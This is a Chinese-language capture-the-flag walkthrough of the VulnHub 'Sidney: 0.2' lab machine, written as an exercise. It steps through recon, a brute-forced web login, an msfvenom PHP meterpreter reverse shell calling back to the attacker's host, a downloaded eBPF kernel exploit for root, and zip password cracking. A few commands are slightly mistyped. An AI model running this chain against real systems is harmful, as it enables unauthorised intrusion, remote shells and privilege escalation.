# CTF夺旗挑战！看老外如何玩转(二)

今天，我们将完成一个噩梦般的 CTF系列的 root2boot 挑战！ 这次的挑战我们将在 Sidney: 0.2 系统上完成！我们可以从这里下载到该系统：https://www.vulnhub.com/entry/sidney-02,149/ 。记住获取 root 权限并不是结束，我们的最终目的是夺取 flag ！下面我们开始挑战！

首先让我们来获取目标的 IP：

**netdiscover**

![](../Images/6e8c9b406954e35c3cf1c20e6f130242.png)

我们的目标 IP 为：**192.168.0.104 **,现在让我们对它进行一个简单的扫描：

**nmap -A -p- 192.168.0.104**

![](../Images/48f88706d8108aaacae5ea59504d8f3e.png)

从以上扫描结果我们可以看到，其开放了 80 端口，这说明我们可以在浏览器上打开它，我们来尝试下：

![](../Images/fb19d69a54eaf863d851f1cb8c8bf05d.png)

通过目标 IP 在浏览器打开，我们没有获取到什么有价值的信息。因此我们使用 curl 命令来让它显示更详细的信息：

**curl -v http://192.168.0.104/**

![](../Images/9d42a277e0dd36273d564dac48525a3a.png)

通过以上信息，我们可以发现 src 里的一个文件名 **commorode64**，我们同样在浏览器尝试打开它：

**192.168.0.104/commorode64**

很幸运，我们找到了其他的页面。

![](../Images/8cacaa643290d9e796a287ff332c7488.png)

现在让我们来右键查看它的源代码：

![](../Images/2a00be24163dd07b1f31c2059f20685b.png)

从源代码中我们可以知道 用户名为 **robhubbard **，并且得到了密码的一些特征规则：

1.密码为小写的。

2.密码有3个字母和四个数字。

3.与 c=64 的声音芯片相关。

接着，我们通过已获取到的信息再来继续探索，看能否获取到更多有价值的信息：

**nikto -h http://192.168.0.104/commodore64/**

![](../Images/8c1e48dfe076b65ed4e54c6292958481.png)

通过探索，我们发现了一个 index.php 的文件，我们继续尝试在浏览器中打开它。我们可以看到有一个登录界面，要求我们输入用户密码，我们当前只获取了用户名，因此接下来我们就是要找到密码：

![](../Images/a550a366d6d8be52ed50d141f8a2eaaf.png)

通过之前获取的密码特征信息，其中第三条与 c=64 sound chip 有关，那么让我们来用维基百科来搜索下。

![](../Images/0b32001039ef17579338e0486d96ef0c.png)

从密码的特征看说有三个字母，那么我们结合结果，我们猜测密码前三个字母为 **MOS 。**现在，我们要做的就是得到后四位为数字的密码。为了后续的破解方便，我们使用 crunch 生成具有特定信息的密码字典：

**crunch 7 7 -t mos%%%% -o /root/Desktop/pass.txt**

![](../Images/a80aabf43aa5693c8392ad819ff1074d.png)

下面，我们使用 **burp suite **来对登录界面进行爆破：

![](../Images/67d6cf88f36fa47d40a0d3bd5cb48672.png)

从以上结果我们可以看到密码已经被我们爆破成功：

**mos6518**

接着我们输入用户名和密码登录：

![](../Images/7d29e32fbe25ea92ff7f397202ebfd00.png)

登录后我们进到如下界面：

![](../Images/fa1517837ccb150d0978d3e05b87398e.png)

现在我们在 KALI 上生成一个 shell ：

**msfvenom -p php/meterpreter/reverse\_tcp lhost=192.168.0.106 lport=4444 -f raw**

![](../Images/a5493bf47088d3f1fb1f7706bd938486.png)

我们将生成的 php 代码从**<?php 到** **die() **的代码复制，并粘贴保存为一个后缀为 php的文件。并将该文件上传到我们登录的页面。

![](../Images/24d5c400535f3c038175034177ba5895.png)

上传成功后，我们在 KALI 上打开一个侦听程序：

**use exploit/multi/handler**

**set payload php/meterpreter/reverse\_tcp**

**set lhost 192.168.0.106**

**set lport 4444**

**exploit**

执行成功后，我们会得到一个 shell：

**shell**

**echo “import pty; pty.spawn(‘ /bin/bash’)” > /tmp/asdf.py**

**python /tmp/asdf.py**

**python3.5 -c ‘import pty; pty.spawn(‘/bin/bash’)” > /tmp/asdf.py**

**bin/bash**

通过一下命令来查看目标系统的内核版本：

**lsb release -a**

![](../Images/936ab1534042f19558ca84c80829541c.png)

在获取到内核版本后，我们可以通过  www.exploit-db.com 网站来查找，看是否有该内核版本的 Exploit 。

![](../Images/47919e82af5aa03befd0ca8da86e7167.png)

很幸运！我们找到了该内核的 Exploit ，我们将代码下载到本地。

![](../Images/9fac984abcb54f9a67c797e859b3f32a.png)

下载成功后，我们先在目标系统上查找一下有哪些可写入目录：

**find / -writable -type d 2>/dev/null**

我们选择：

**cd /tmp**

我们使用 curl 命令，来远程获取  Exploit ：

curl -O https://raw.githubusercontent.com/ofensive-security/exploit-database-bin-sploits/master/sploits/39772.zip

![](../Images/b0cbf2f535336c0ec4df9d21bb6790d6.png)

现在，我们来对该 zip 文件进行解压：

**unzip 39772.zip**

![](../Images/da94a877c5113954cf566c80fee5c89b.png)

我们进到解压后的目录:

**cd 39772**

**ls** 后，我们得到一个 tar 的文件压缩包，我们对其解压**：**

**tar -xvf exploit.tar**

进到解压后 doubleput.c：

**cd ebpf\_mapfd\_doubleput\_exploit**

![](../Images/22bc8b60c4f28560d24654ffa17c881e.png)

下面我们在该目录下，执行如下操作：

**ls **

**./compile.sh**

**./doubleput **

**whoami **

**cd /root**

**ls**

![](../Images/bfb2bfdc535d5230197ca8878cbf80f5.png)

现在我们已经成功提权为 root 权限，并获取了 root 家目录的所有操作权限。我们使用命令查看，当前 root 家目录下，有哪些重要信息文件：

**ls -lsa**

我们看到了一个 gif 的图片文件，我们将其拷贝到 Apache 站点根目录下，将其打开：

**cp hint.gif /var/www/html**

![](../Images/a095235bd75673911ba7305b9b9ad7be.png)

当我们在浏览器中打开  hint.gif ，我们会看到如下页面：

![](../Images/5b9f3817f68a7177668dad90742d15ec.png)

看来还不是我们想要的结果，我们继续查看其它文件目录，例如 **commodore64 ：**

**cd .commodore64**

**ls -lsa**

**cd .miami**

**ls -lsa**

**cd vice**

**flag.zip**

![](../Images/20b7ae762084af7b05d80118e2d3e162.png)

不要高兴的太早，接下来我们还需要下载该压缩包，并对其的解压密码进行爆破，才能最终打开它！

同样，我们首先将其拷贝到站点目录下：

**cp flag.zip /var/www/html/commodore64**

![](../Images/04fb0a7456e3fa8ea9b87c26c22b012b.png)

当我们在浏览器打开它时，会弹框提示我们下载 flag.zip 。

![](../Images/b2b84653591f4ea143c7226ec9a7f6e9.png)

接下来我们使用 rockyou.txt 这个字典来进行爆破！

**fcrackzip -vuD -p /usr/share/wordlists/rockyou.txt /root/Desktop/flag.zip**

![](../Images/d77247d36387a103a820f94589fe5eb7.png)

在获取密码后，现在我们就可以来解压它了：

**unzip flag.zip**

![](../Images/5fd63d8137683e081bcab278c2e2236c.png)

这样，我们就成功夺旗了！

![](../Images/6986178bc37e8eaf8d513d4f7842c2d8.png)
